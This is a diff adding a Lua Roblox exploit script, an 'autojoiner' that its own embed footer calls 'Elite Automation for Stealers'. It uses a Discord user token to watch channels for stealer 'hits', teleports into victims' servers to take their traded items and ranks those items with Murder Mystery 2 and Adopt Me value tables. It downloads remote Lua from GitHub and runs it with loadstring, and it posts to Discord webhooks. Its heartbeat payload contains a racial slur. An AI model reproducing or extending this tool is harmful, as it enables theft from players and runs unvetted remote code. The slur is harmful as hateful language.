@@ -1,0 +1,2447 @@
+if not Webhooks then
+	Webhooks = {}
+end
+
+if Webhook then
+	table.insert(Webhooks, Webhook)
+end
+
+Players = cloneref(game:GetService("Players"))
+
+if not isfolder("x-autojoiner" .. Players.LocalPlayer.Name) then
+	makefolder("x-autojoiner" .. Players.LocalPlayer.Name)
+end
+
+if not isfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/webhook-database.txt") then
+	writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/webhook-database.txt", "{\"WebhookToId\": {}, \"IdToWebhook\": {}}")
+end
+
+if not isfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/joining.txt") then
+	writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/joining.txt", "")
+end
+
+if not isfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/queued-hits.txt") then
+	writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/queued-hits.txt", "{}")
+end
+
+if not isfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/latest_channel.txt") then
+	writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/latest_channel.txt", "")
+end
+
+if not isfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/joined_ids.txt") then
+	writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/joined_ids.txt", "{}")
+end
+
+COREGUI = cloneref(game:GetService("CoreGui"))
+UserInputService = cloneref(game:GetService("UserInputService"))
+HttpService = cloneref(game:GetService("HttpService"))
+TeleportService = cloneref(game:GetService("TeleportService"))
+ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
+TextChatService = cloneref(game:GetService("TextChatService"))
+VirtualUser = cloneref(game:GetService("VirtualUser"))
+GuiService = cloneref(game:GetService("GuiService"))
+RunService = cloneref(game:GetService("RunService"))
+ContentProvider = cloneref(game:GetService("ContentProvider"))
+MarketplaceService = cloneref(game:GetService("MarketplaceService"))
+TRADE_INACTIVITY_TIMER = 0
+CURRENTLY_TELEPORTING = false
+TeleportService.TeleportInitFailed:Connect(function()
+	CURRENTLY_TELEPORTING = false
+end)
+
+function get_table(p1)
+	local function v182(p2)
+		local s1 = ""
+
+		for _ = 1, p2 do
+			s1 = s1 .. "\t"
+		end
+
+		return s1
+	end
+
+	local t1 = {}
+	local t2 = {}
+	local t3 = {}
+	local n1 = 1
+	local s2 = "{\n"
+	local g197 = nil
+
+	while true do
+		local n2 = 0
+
+		for _, _ in pairs(p1) do
+			n2 = n2 + 1
+		end
+
+		local n3 = 1
+
+		for k, v in pairs(p1) do
+			if t1[p1] ~= nil and not (n3 >= t1[p1]) then
+				if n3 == n2 then
+					s2 = s2 .. "\n" .. v182(n1 - 1) .. "}"
+				end
+			else
+				if not string.find(s2, "}", s2:len()) then
+					if not string.find(s2, "\n", s2:len()) then
+						s2 = s2 .. "\n"
+					end
+				else
+					s2 = s2 .. ",\n"
+				end
+
+				table.insert(t3, s2)
+
+				local s3 = ""
+				local v195
+
+				if type(k) ~= "number" and type(k) ~= "boolean" then
+					v195 = "['" .. tostring(k) .. "']"
+				else
+					v195 = "[" .. tostring(k) .. "]"
+				end
+
+				local v196
+
+				if type(v) ~= "number" and type(v) ~= "boolean" then
+					if type(v) == "table" then
+						s2 = s3 .. v182(n1) .. v195 .. " = {\n"
+						table.insert(t2, p1)
+						table.insert(t2, v)
+						t1[p1] = n3 + 1
+
+						break
+					end
+
+					v196 = s3 .. v182(n1) .. v195 .. " = '" .. tostring(v) .. "'"
+				else
+					v196 = s3 .. v182(n1) .. v195 .. " = " .. tostring(v)
+				end
+
+				if n3 ~= n2 then
+					s2 = v196 .. ","
+				else
+					s2 = v196 .. "\n" .. v182(n1 - 1) .. "}"
+				end
+			end
+
+			n3 = n3 + 1
+		end
+
+		if not (#t2 > 0) then
+			break
+		end
+
+		p1 = t2[#t2]
+		t2[#t2] = nil
+
+		repeat
+			if g197 or t1[p1] ~= nil then
+				g197 = false
+				n1 = n1 - 1
+			else
+				local v198 = n1 + 1
+
+				if not v198 then
+					g197 = true
+				end
+
+				if not g197 then
+					n1 = v198
+				end
+			end
+		until not g197
+	end
+
+	table.insert(t3, s2)
+
+	return (table.concat(t3))
+end
+
+local function u1()
+	local ok, result = pcall(readfile, "x-autojoiner" .. Players.LocalPlayer.Name .. "/webhook-database.txt")
+
+	if ok then
+		return HttpService:JSONDecode(result)
+	end
+
+	Players.LocalPlayer:Kick("Failed to read database file: " .. result)
+
+	return nil
+end
+local function u2(p3)
+	local ok, result = pcall(function()
+		writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/webhook-database.txt", HttpService:JSONEncode(p3))
+	end)
+
+	if not ok then
+		Players.LocalPlayer:Kick("Failed to write to database file: " .. result)
+	end
+end
+
+function getChannelIdFromWebhook(p4)
+	local v130 = u1()
+
+	if v130 then
+		if not v130.WebhookToId[p4] then
+			local ok, result = pcall(function()
+				local v260 = game:HttpGet(p4)
+
+				return HttpService:JSONDecode(v260)
+			end)
+
+			if not ok or not result.channel_id then
+				Players.LocalPlayer:Kick("Invalid webhook detected: " .. p4)
+
+				return
+			end
+
+			local channel_id = result.channel_id
+
+			v130.WebhookToId[p4] = channel_id
+			v130.IdToWebhook[channel_id] = p4
+			u2(v130)
+
+			return channel_id
+		end
+
+		return v130.WebhookToId[p4]
+	end
+end
+function getWebhookFromChannelId(p5)
+	local v168 = u1()
+
+	if v168 then
+		if not v168.IdToWebhook[p5] then
+			Players.LocalPlayer:Kick("Invalid channel ID detected: " .. p5)
+
+			return
+		end
+
+		return v168.IdToWebhook[p5]
+	end
+end
+function len(p6)
+	local n4 = 0
+
+	for _ in pairs(p6) do
+		n4 = n4 + 1
+	end
+
+	return n4
+end
+
+local t4 = {}
+
+if not (len(Webhooks) > 0) then
+	Players.LocalPlayer:Kick("No Webhooks Entered. Please check ur auto joiner settings")
+
+	return
+end
+
+for _, v in pairs(Webhooks) do
+	local v6 = getChannelIdFromWebhook(v)
+
+	if v6 then
+		table.insert(t4, v6)
+	end
+end
+
+function is_channel_supported(p7)
+	for _, v in pairs(t4) do
+		if v == p7 then
+			return true, getWebhookFromChannelId(p7)
+		end
+	end
+
+	return false
+end
+function get_victim_that_im_joining()
+	return readfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/joining.txt")
+end
+function extractPlaceAndJobID(p8)
+	return p8:match("TeleportToPlaceInstance%((%d+)"), (p8:match("TeleportToPlaceInstance%(%d+%,%s*\"(.-)\""))
+end
+function GetServerHopFunction()
+	if not isfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/serverhop.lua") then
+		local _serverhop = game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/addons/serverhop.lua")
+
+		if not string.find(_serverhop, "return") then
+			Players.LocalPlayer:Kick("Failed to get serverhop function, report this to egorikusa!")
+		else
+			writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/serverhop.lua", _serverhop)
+		end
+	end
+
+	return loadstring(readfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/serverhop.lua"))
+end
+
+ServerHop = GetServerHopFunction()
+GuiService.ErrorMessageChanged:Connect(function(p9)
+	if not string.find(p9, "Teleport Failed:") then
+		ServerHop()
+	end
+end)
+
+local ScreenGui = Instance.new("ScreenGui")
+
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.DisplayOrder = 1000
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = COREGUI
+
+local Frame = Instance.new("Frame")
+
+Frame.Size = UDim2.new(0, 400, 0, 400)
+Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+local TextButton = Instance.new("TextButton")
+
+TextButton.Size = UDim2.new(0, 30, 0, 30)
+TextButton.Position = UDim2.new(1, -40, 0, 5)
+TextButton.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+TextButton.Text = "[-]"
+TextButton.Font = Enum.Font.FredokaOne
+TextButton.TextColor3 = Color3.new(1, 1, 1)
+TextButton.TextSize = 20
+TextButton.Parent = Frame
+
+local TextLabel = Instance.new("TextLabel")
+
+TextLabel.Size = UDim2.new(1, -10, 0, 40)
+TextLabel.Position = UDim2.new(0, 5, 0, 5)
+TextLabel.BackgroundTransparency = 1
+TextLabel.TextColor3 = Color3.new(1, 1, 1)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.TextSize = 24
+TextLabel.Text = "Status: Idle"
+TextLabel.TextWrapped = true
+TextLabel.Parent = Frame
+
+local TextLabel2 = Instance.new("TextLabel")
+
+TextLabel2.Size = UDim2.new(1, -10, 0, 40)
+TextLabel2.Position = UDim2.new(0, 5, 0, 50)
+TextLabel2.BackgroundTransparency = 1
+TextLabel2.TextColor3 = Color3.new(1, 1, 1)
+TextLabel2.Font = Enum.Font.FredokaOne
+TextLabel2.TextSize = 20
+TextLabel2.Text = "Last Message: None"
+TextLabel2.TextWrapped = true
+TextLabel2.Parent = Frame
+
+local TextLabel3 = Instance.new("TextLabel")
+
+TextLabel3.Size = UDim2.new(1, -10, 0, 40)
+TextLabel3.Position = UDim2.new(0, 5, 0, 100)
+TextLabel3.BackgroundTransparency = 1
+TextLabel3.TextColor3 = Color3.new(1, 1, 1)
+TextLabel3.Font = Enum.Font.FredokaOne
+TextLabel3.TextSize = 20
+TextLabel3.Text = "Time of Last Message: N/A"
+TextLabel3.TextWrapped = true
+TextLabel3.Parent = Frame
+
+local TextLabel4 = Instance.new("TextLabel")
+
+TextLabel4.Size = UDim2.new(1, -10, 0, 40)
+TextLabel4.Position = UDim2.new(0, 5, 0, 150)
+TextLabel4.BackgroundTransparency = 1
+TextLabel4.TextColor3 = Color3.new(1, 1, 1)
+TextLabel4.Font = Enum.Font.FredokaOne
+TextLabel4.TextSize = 20
+TextLabel4.Text = "Time Since Last Message: N/A"
+TextLabel4.TextWrapped = true
+TextLabel4.Parent = Frame
+
+local TextLabel5 = Instance.new("TextLabel")
+
+TextLabel5.Size = UDim2.new(1, -10, 0, 40)
+TextLabel5.Position = UDim2.new(0, 5, 0, 200)
+TextLabel5.BackgroundTransparency = 1
+TextLabel5.TextColor3 = Color3.new(1, 1, 1)
+TextLabel5.Font = Enum.Font.FredokaOne
+TextLabel5.TextSize = 20
+TextLabel5.Text = "Last Trade Activity Was N/A Seconds Ago."
+TextLabel5.TextWrapped = true
+TextLabel5.Parent = Frame
+
+local TextLabel6 = Instance.new("TextLabel")
+
+TextLabel6.Size = UDim2.new(1, -20, 0, 140)
+TextLabel6.Position = UDim2.new(0, 5, 0, 250)
+TextLabel6.BackgroundTransparency = 1
+TextLabel6.TextColor3 = Color3.new(1, 1, 1)
+TextLabel6.Font = Enum.Font.FredokaOne
+TextLabel6.TextSize = 20
+TextLabel6.TextWrapped = true
+TextLabel6.Parent = Frame
+TextLabel6.TextColor3 = Color3.fromRGB(237, 165, 255)
+cmds = "!inventory => sends inventory data\n!status => sends all joiner data in discord\n!rejoin => rejoins auto joiner\n!kick => kicks auto joiner out of game\n\nForgot Them?: Write !help In Discord"
+TextLabel6.Text = "List Of Autojoiner Cmds:\n" .. cmds
+
+local s4 = "None"
+local timestamp = os.time()
+local u18 = true
+
+function notifyGUI(p10, p11)
+	timestamp = os.time()
+	updateTimeSinceLastMessage()
+	s4 = p10
+	TextLabel.Text = "Status: " .. p11
+	TextLabel2.Text = "Last Message: " .. p10
+	TextLabel3.Text = "Time of Last Message: " .. os.date("%H:%M:%S", os.time())
+end
+function updateTimeSinceLastMessage()
+	local v143 = os.time() - timestamp
+	local v144 = math.floor(v143 / 3600)
+	local v145 = math.floor(v143 % 3600 / 60)
+	local v146 = v143 % 60
+
+	TextLabel4.Text = string.format("Time Since Last Message: %02d:%02d:%02d", v144, v145, v146)
+
+	if v143 > 100 then
+		local v147 = get_latest_channel()
+
+		if v147 == "" then
+			LoggigWebhook = Webhooks[1]
+		else
+			LoggingWebhook = getWebhookFromChannelId(v147)
+		end
+
+		request({
+			Url = LoggingWebhook,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = HttpService:JSONEncode({
+				content = "Seems like auto joiner lost connnection and stopped listening for messages (last message was 5 minutes ago), rejoining for your hits safety!"
+			})
+		})
+		ServerHop()
+		wait(60)
+	end
+end
+
+TextButton.MouseButton1Click:Connect(function()
+	isCollapsed = not isCollapsed
+
+	if not isCollapsed then
+		Frame.Size = UDim2.new(0, 400, 0, 400)
+		TextLabel2.Visible = true
+		TextLabel3.Visible = true
+		TextLabel4.Visible = true
+		TextLabel6.Visible = true
+		TextButton.Text = "[-]"
+	else
+		Frame.Size = UDim2.new(0, 400, 0, 46)
+		TextLabel2.Visible = false
+		TextLabel3.Visible = false
+		TextLabel4.Visible = false
+		TextLabel6.Visible = false
+		TextButton.Text = "[+]"
+	end
+end)
+task.spawn(function()
+	while true do
+		wait(1)
+
+		if u18 then
+			updateTimeSinceLastMessage()
+		end
+	end
+end)
+
+function Action(p12, p13)
+	if p12 ~= "!status" then
+		if p12 ~= "!rejoin" then
+			if p12 ~= "!kick" then
+				if p12 ~= "!inventory" then
+					if p12 == "!help" then
+						request({
+							Url = p13,
+							Method = "POST",
+							Headers = {
+								["Content-Type"] = "application/json"
+							},
+							Body = HttpService:JSONEncode({
+								content = "",
+								embeds = {{
+									title = "⚙\239\184\143 X Scripts Autojoiner — Commands",
+									description = "**Easily control ur auto joiner while being away from your machine!**",
+									color = 9133302,
+									fields = {
+										{
+											name = "📦 !inventory",
+											value = "View your entire inventory sorted by price!"
+										},
+										{
+											name = "📊 !status",
+											value = "Use this to know status of auto joiner, everything that u need is here!"
+										},
+										{
+											name = "🔁 !rejoin",
+											value = "Force the Autojoiner to rejoin."
+										},
+										{
+											name = "❌ !kick",
+											value = "Closes the game, kicking u with 100% success!"
+										}
+									},
+									footer = {
+										text = "X Scripts Autojoiner • Elite Automation for Stealers"
+									},
+									timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+								}}
+							})
+						})
+					end
+				else
+					InventoryReport(game.GameId, p13)
+				end
+			else
+				game:Shutdown()
+			end
+		else
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
+		end
+	else
+		request({
+			Url = p13,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = HttpService:JSONEncode({
+				content = "",
+				embeds = {{
+					title = "Auto Joiner Information:",
+					description = "",
+					color = 9133302,
+					fields = {
+						{
+							name = "Ping:",
+							value = math.floor(Players.LocalPlayer:GetNetworkPing() * 1000) .. " ms",
+							inline = false
+						},
+						{
+							name = "Status:",
+							value = TextLabel.Text:gsub("Status: ", ""),
+							inline = false
+						},
+						{
+							name = "Last Message:",
+							value = TextLabel2.Text:gsub("Last Message: ", ""),
+							inline = false
+						},
+						{
+							name = "Last Message Time:",
+							value = TextLabel4.Text:gsub("Time Since Last Message: ", ""),
+							inline = false
+						},
+						{
+							name = "Trade Activity:",
+							value = TextLabel5.Text,
+							inline = false
+						},
+						{
+							name = "Username:",
+							value = game.Players.LocalPlayer.Name,
+							inline = false
+						}
+					}
+				}}
+			})
+		})
+	end
+end
+function big_notify(p14, p15)
+	request({
+		Url = p15,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode({
+			content = p14
+		})
+	})
+end
+
+TRADE_INACTIVITY_LIMIT = 12
+
+function shall_teleport()
+	local v142 = get_victim_that_im_joining()
+
+	if Players:FindFirstChild(v142) then
+		if not (TRADE_INACTIVITY_TIMER > TRADE_INACTIVITY_LIMIT) then
+			return false
+		end
+
+		return true
+	end
+
+	return true
+end
+function append_hit_to_list(p16, p17, p18)
+	local data2 = HttpService:JSONDecode(readfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/queued-hits.txt"))
+
+	data2[p18] = {
+		PlaceID = p16,
+		JobID = p17,
+		Name = p18,
+		Time = tick()
+	}
+	writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/queued-hits.txt", HttpService:JSONEncode(data2))
+end
+function join_latest_hit_from_queue()
+	local data3 = HttpService:JSONDecode(readfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/queued-hits.txt"))
+
+	if len(data3) > 0 then
+		CURRENTLY_TELEPORTING = true
+
+		local t5 = {}
+
+		for _, v in pairs(data3) do
+			table.insert(t5, v)
+		end
+
+		table.sort(t5, function(p19, p20)
+			return p19.Time < p20.Time
+		end)
+
+		local v79 = t5[1]
+		local Name = v79.Name
+
+		data3[Name] = nil
+		writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/joining.txt", Name)
+		writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/queued-hits.txt", HttpService:JSONEncode(data3))
+
+		local v81 = get_latest_channel()
+
+		if v81 == "" then
+			LoggigWebhook = Webhooks[1]
+		else
+			LoggingWebhook = getWebhookFromChannelId(v81)
+		end
+
+		request({
+			Url = LoggingWebhook,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = HttpService:JSONEncode({
+				content = "Joining " .. v79.Name
+			})
+		})
+		TeleportService:TeleportToPlaceInstance(v79.PlaceID, v79.JobID)
+		TRADE_INACTIVITY_TIMER = 0
+	end
+end
+function get_latest_channel()
+	return readfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/latest_channel.txt")
+end
+
+local data4 = HttpService:JSONDecode(readfile("x-autojoiner" .. Players.LocalPlayer.Name .. "/joined_ids.txt"))
+
+function save_joined_id(p21)
+	table.insert(data4, p21)
+	writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/joined_ids.txt", HttpService:JSONEncode(data4))
+end
+function check_missed_hits_on_teleport(p22)
+	local v121 = request({
+		Url = "https://discord.com/api/v9/channels/" .. p22 .. "/messages?limit=10",
+		Method = "GET",
+		Headers = {
+			Authorization = Discord_Token,
+			["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+			["Content-Type"] = "application/json"
+		}
+	})
+
+	if v121.StatusCode == 200 then
+		local data5 = HttpService:JSONDecode(v121.Body)
+
+		if #data5 == 0 then
+			return
+		end
+
+		for _, v in pairs(data5) do
+			local v125, v126 = extractPlaceAndJobID(v.content)
+
+			if v125 and v126 and not table.find(data4, tostring(v.id)) then
+				parse_message(v)
+			end
+		end
+	end
+end
+function parse_message(p23)
+	notifyGUI(p23.content, "Listening...")
+
+	if is_channel_supported(p23.channel_id) then
+		LoggingWebhook = getWebhookFromChannelId(p23.channel_id)
+		Action(p23.content, LoggingWebhook)
+
+		if string.find(p23.content, "@everyone") then
+			local v170, v171 = extractPlaceAndJobID(p23.content)
+
+			if v170 and v171 then
+				if type(tonumber(v170)) == "number" then
+					USERNAME = p23.author.username
+
+					if game.PlaceId ~= 126884695634066 or tonumber(v170) == 126884695634066 then
+						if game.PlaceId == 126884695634066 or tonumber(v170) ~= 126884695634066 then
+							writefile("x-autojoiner" .. Players.LocalPlayer.Name .. "/latest_channel.txt", p23.channel_id)
+							save_joined_id(tostring(p23.id))
+
+							if not Players:FindFirstChild(USERNAME) then
+								notifyGUI(p23.content, "Joining...")
+								append_hit_to_list(v170, v171, USERNAME)
+
+								return
+							end
+
+							task.spawn(function()
+								repeat
+									task.wait(0.1)
+								until Launch
+
+								Launch()
+							end)
+
+							return
+						end
+
+						save_joined_id(tostring(p23.id))
+						big_notify("Risky to teleport from other game to GAG because u cant teleport back!", LoggingWebhook)
+
+						return
+					end
+
+					big_notify("Impossible to teleport from GAG to other game!", LoggingWebhook)
+					save_joined_id(tostring(p23.id))
+
+					return
+				end
+
+				return
+			end
+
+			return
+		end
+
+		return
+	end
+end
+function backup_no_websocket()
+	task.spawn(function()
+		while task.wait(10) do
+			task.spawn(function()
+				for _, v in pairs(t4) do
+					check_missed_hits_on_teleport(v)
+				end
+			end)
+		end
+	end)
+end
+function connect_discord()
+	for _, v in pairs(t4) do
+		check_missed_hits_on_teleport(v)
+	end
+
+	local ok, result = pcall(WebSocket.connect, "wss://gateway.discord.gg/?v=10&encoding=json")
+
+	if ok then
+		local t6 = {
+			op = 2,
+			d = {
+				token = Discord_Token,
+				properties = {
+					["$os"] = "windows",
+					["$browser"] = "chrome",
+					["$device"] = "chrome"
+				}
+			}
+		}
+
+		result:Send(HttpService:JSONEncode(t6))
+		notifyGUI("none", "Connecting...")
+		result.OnMessage:Connect(function(p24)
+			e = HttpService:JSONDecode(p24)
+
+			if e.op == 10 and e.d.heartbeat_interval ~= nil then
+				waittime = e.d.heartbeat_interval / 1000
+				notifyGUI("heartbeat recieved", "Connected!")
+				task.spawn(function()
+					local v284 = get_latest_channel()
+
+					if v284 == "" then
+						Webhook = Webhooks[1]
+					else
+						Webhook = getWebhookFromChannelId(v284)
+					end
+
+					request({
+						Url = Webhook,
+						Method = "POST",
+						Headers = {
+							["Content-Type"] = "application/json"
+						},
+						Body = HttpService:JSONEncode({
+							content = "Autojoiner Connected!"
+						})
+					})
+				end)
+
+				while wait(waittime) do
+					result:Send(HttpService:JSONEncode({
+						op = 1,
+						d = "nigger"
+					}))
+				end
+			end
+
+			if e.t == "MESSAGE_CREATE" then
+				local d2 = e.d
+
+				parse_message(d2)
+
+				return
+			end
+		end)
+		result.OnClose:Connect(function(_)
+			connect_discord()
+		end)
+
+		return
+	end
+
+	backup_no_websocket()
+end
+
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+Players.LocalPlayer.Idled:Connect(function()
+	VirtualUser:CaptureController()
+	VirtualUser:ClickButton2(Vector2.new())
+end)
+
+local u20 = get_victim_that_im_joining()
+
+if Players:FindFirstChild(u20) then
+end
+
+local u21 = true
+
+if not u21 then
+	local u22 = nil
+
+	u22 = Players.PlayerRemoving:Connect(function(player)
+		if player.Name == u20 then
+			if u22 then
+				u22:Disconnect()
+				u22 = nil
+			end
+
+			u21 = true
+		end
+	end)
+end
+
+connect_discord()
+
+function StartCountingTradeInactivity(p26)
+	TRADE_INACTIVITY_LIMIT = p26 or 12
+	task.spawn(function()
+		while task.wait(1) do
+			TextLabel5.Text = "Last Trade Activity Was " .. TRADE_INACTIVITY_TIMER .. " Seconds Ago."
+		end
+	end)
+	task.wait(0.1)
+	task.spawn(function()
+		while task.wait(1) do
+			TRADE_INACTIVITY_TIMER = TRADE_INACTIVITY_TIMER + 1
+		end
+	end)
+end
+function get_mm2_values()
+	local t7 = {
+		BaubleChroma = 12000,
+		Blossom_G = 880,
+		GingerLuger = 23,
+		Bioblade = 15,
+		TravelerAxe = 6500,
+		Frostbite = 7,
+		SwirlyGun = 60,
+		TreeGun = 1,
+		TidesChroma = 50,
+		TravelerGunChroma = 170000,
+		Prismatic = 7,
+		Lugercane = 23,
+		Iceflake = 28,
+		ZombieBat = 285,
+		Pearl_K = 65,
+		FangChroma = 55,
+		EternalCane = 23,
+		Deathshard = 20,
+		Arctic_G_2022 = 4,
+		Latte_G_2023 = 160,
+		Gingerscope = 10200,
+		TreeGun2023 = 2575,
+		Eternal4 = 10,
+		Clockwork = 22,
+		RedSeer = 3,
+		Xmas = 12,
+		Icebeam = 28,
+		Gingermint_KChroma = 63,
+		ConstellationChroma = 11000,
+		Pumpking = 12,
+		Hallowscythe = 48,
+		Flora = 145,
+		DeathshardChroma = 60,
+		Eternal3 = 10,
+		Candleflame = 65,
+		Boneblade = 7,
+		RedFire = 3,
+		Frostfade_K_2023 = 1,
+		Saw = 7,
+		Icedriller_G_2020 = 8,
+		Makeshift = 65,
+		VampireGunChroma = 17000,
+		Plasmabeam = 28,
+		Beach_K_2023 = 25,
+		Icecracker_K_2020 = 2,
+		GhostK2018 = 6,
+		GhostG2018 = 2,
+		Waves_K = 155,
+		ShadowKnife = 6,
+		Knife1 = 3,
+		EliteGreen = 4,
+		ElderwoodKnifeChroma = 65,
+		SantasMagic = 5,
+		Flames = 10,
+		FlowerwoodGun = 150,
+		Harvester = 675,
+		Cavern_K_2019 = 17,
+		Bauble = 500,
+		GreenLuger = 40,
+		Broken_K_2023 = 8,
+		Cookieblade = 4,
+		Frostsaber = 13,
+		Plasmablade = 28,
+		HeatChroma = 60,
+		TreeKnife2023Chroma = 32000,
+		WatergunChroma = 3000,
+		SlasherChroma = 60,
+		Heartblade = 130,
+		HallowsBlade = 10,
+		WraithGun = 170,
+		Blaster = 25,
+		Rainbow_G = 275,
+		Darkbringer = 60,
+		Web = 1,
+		Hallowgun = 27,
+		AuroraKnife = 105,
+		IceDragon = 10,
+		Rainbow_K = 270,
+		Watergun = 115,
+		VampiresEdge = 15,
+		Gingerblade = 22,
+		RedLuger = 60,
+		Lightbringer = 55,
+		Traveler_G_2023 = 5,
+		BonebladeChroma = 40,
+		Minty = 20,
+		Nightblade = 25,
+		Ginger_G_2018 = 6,
+		Logchopper = 22,
+		FlowerwoodKnife = 145,
+		BloodKnife = 10,
+		Heat = 18,
+		LaserChroma = 70,
+		Ocean_G = 160,
+		Bloom = 145,
+		WraithKnife = 170,
+		TravelerGun = 3600,
+		CottonCandy = 50,
+		Scratch = 4,
+		ElderwoodScythe = 65,
+		Spectral_K_2021 = 8,
+		JD = 50,
+		Spider = 17,
+		Pixel = 23,
+		PurpleSeer = 3,
+		Gemstone = 25,
+		Sorry = 850,
+		YellowSeer = 2,
+		Fang = 15,
+		Tree = 1,
+		SwirlyGunChroma = 65,
+		ElderwoodKnife = 65,
+		AmericaSword = 25,
+		Iceblaster = 65,
+		EliteBlue = 4,
+		CandleflameChroma = 65,
+		SharkChroma = 55,
+		Icepiercer = 550,
+		Laser = 8,
+		Witched = 10,
+		Darkshot = 590,
+		Eggblade = 7,
+		Scythe = 60,
+		GhostKnife = 12,
+		SantasSpirit = 5,
+		WintersEdge = 10,
+		Skulls = 12,
+		Gingermint_K = 23,
+		Eternal2 = 8,
+		Amerilaser = 28,
+		SwirlyAxe = 80,
+		AuroraGun = 110,
+		BattleAxe = 12,
+		Sugar = 80,
+		Gingermint_G = 23,
+		TreeKnife2023 = 1025,
+		IceShard = 12,
+		LugerChroma = 90,
+		Darksword = 585,
+		Handsaw = 10,
+		ChromaDarkbringer = 100,
+		ScratchBlue = 2,
+		Chill = 15,
+		Spectre2022 = 60,
+		Shark = 27,
+		SwirlyBlade = 40,
+		Bleed = 1,
+		Luger = 70,
+		BattleAxe2 = 18,
+		Hallow = 12,
+		Eternal = 8,
+		Icewing = 5,
+		SeerChroma = 55,
+		Ghostblade = 7,
+		VampireGun = 675,
+		Celestial = 800,
+		Peppermint = 5,
+		TreeGun2023Chroma = 57000,
+		GemstoneChroma = 50,
+		Snowflake = 7,
+		Constellation = 825,
+		Slasher = 22,
+		GingerbladeChroma = 45,
+		VampireAxe = 600,
+		Icebreaker = 125,
+		Virtual = 22,
+		Nebula = 22,
+		Vampire_K_2022 = 1,
+		Turkey2023 = 2025,
+		Latte_K_2023 = 160,
+		Aurora_G_2021 = 8,
+		SawChroma = 45,
+		Sakura_K = 870,
+		Candy = 190,
+		OrangeSeer = 2,
+		Pearl_G = 65,
+		ElderwoodGun = 60,
+		BlueSeer = 3,
+		Jinglegun = 20,
+		Cavern_G_2019 = 1,
+		ChromaLightbringer = 95,
+		Tides = 15,
+		Phantom2022 = 60,
+		Phaser = 6
+	}
+	local t8 = {
+		Ghosty = 1,
+		Piggy = 25,
+		Traveller = 1,
+		FoxChroma = 15,
+		GreenP = 50,
+		Reindeer = 12,
+		BearChroma = 12,
+		PurpleP = 15,
+		["<3"] = 10,
+		DogFire = 1,
+		Fairy = 15,
+		Elfy = 8,
+		UFO = 5,
+		Jetstream = 15,
+		Santa = 35,
+		BatFire = 1,
+		BatChroma = 17,
+		GreenPumpkin19 = 12,
+		CatFire = 1,
+		Dogey = 65,
+		RedP = 60,
+		Steambird = 1,
+		Badger = 1,
+		Skelly = 1,
+		RedPumpkin19 = 12,
+		VampireBat = 15,
+		Seahorsey = 15,
+		BunnyFire = 1,
+		Pengy = 13,
+		Rudolph = 15,
+		BluePumpkin19 = 2,
+		PumpkinPet = 25,
+		Tankie = 10,
+		ZombieDog = 450,
+		BlueP = 80,
+		BearFire = 1,
+		DogChroma = 18,
+		BunnyChroma = 18,
+		Deathspeaker = 4,
+		Elf2019 = 200,
+		PigChroma = 13,
+		["Overseer Eye"] = 15,
+		Eye = 15,
+		RedPumpkin2020 = 7,
+		GreenPumpkin2020 = 3,
+		Reindeer2020 = 2,
+		Frostbird = 2,
+		CatChroma = 20,
+		BlackCat = 65,
+		Nobledragon = 17,
+		IcePhoenix = 1,
+		Chilly = 13,
+		FoxFire = 1,
+		AmericanEagle = 2,
+		Mechbug = 5,
+		Electro = 2,
+		Phoenix = 2,
+		Skull2021 = 1,
+		PigFire = 1
+	}
+	local t9 = {}
+
+	for k, v in pairs(t7) do
+		t9[k] = v
+	end
+
+	for k, v in pairs(t8) do
+		t9[k] = v
+	end
+
+	return t9, t7, t8
+end
+function get_adoptme_values()
+	local load = require(ReplicatedStorage.Fsys).load
+
+	load("RouterClient")
+
+	local v164 = load("ClientData")
+
+	load("InventoryDB")
+	v164.get("inventory")
+
+	if not getgenv().Parsed_Values then
+		getgenv().Parsed_Values = HttpService:JSONDecode(HttpService:JSONDecode(game:HttpGet("https://raw.githubusercontent.com/f4shn/scripts/refs/heads/main/values")).pets)
+	end
+
+	Values = {
+		pets = {},
+		pet_accessories = {},
+		transport = {},
+		other = {}
+	}
+
+	for k, v in pairs(Parsed_Values) do
+		if k ~= "version" then
+			d = v["rvalue - nopotion"]
+			n = v["nvalue - nopotion"]
+			m = v["mvalue - nopotion"]
+			dr = v["rvalue - ride"]
